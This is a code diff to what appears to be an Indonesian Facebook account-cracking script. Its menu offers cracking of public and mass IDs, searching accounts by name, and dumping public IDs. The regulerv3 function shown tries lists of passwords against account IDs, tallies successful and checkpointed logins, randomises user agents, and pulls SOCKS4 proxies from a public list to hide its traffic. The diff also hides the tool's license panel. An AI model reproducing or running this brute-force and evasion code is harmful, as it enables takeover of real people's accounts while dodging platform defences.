@@ -652,9 +652,9 @@ def menu(my_name,my_id):
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     prints(Panel(f"{U2}{ip}",padding=(0,30),title=f"{P2}Halo, {H2}{my_name} {P2}{waktucok()}",subtitle=f"{P2}{negara}",style=f"{color_panel}"))
-    dia.append(Panel(f'{P2}lisensi : {H2}{key}-****-****\n{P2}premium : {H2}{prem}',width=38,padding=(0,2),style=f"{color_panel}"))
-    dia.append(panel(f'{P2}Join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}',width=38,padding=(0,2),style=f"{color_panel}"))
-    console.print(Columns(dia))
+    #dia.append(Panel(f'{P2}lisensi : {H2}{key}-****-****\n{P2}premium : {H2}{prem}',width=38,padding=(0,2),style=f"{color_panel}"))
+    #dia.append(panel(f'{P2}Join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}',width=38,padding=(0,2),style=f"{color_panel}"))
+    #console.print(Columns(dia))
     prints(Panel(f"""{P2}
 [{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari pencarian nama
 [{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
@@ -1346,13 +1346,14 @@ def regulerv3(idf,pwv,url):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f'\r[bold white]Grap-Api[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(ugent)
+	ua = random.choice(free)
 	#ua = random.choice(free)
 	ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
 			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 			open('socksku.txt','w').write(proxs)
 			nip = rc(proxs)
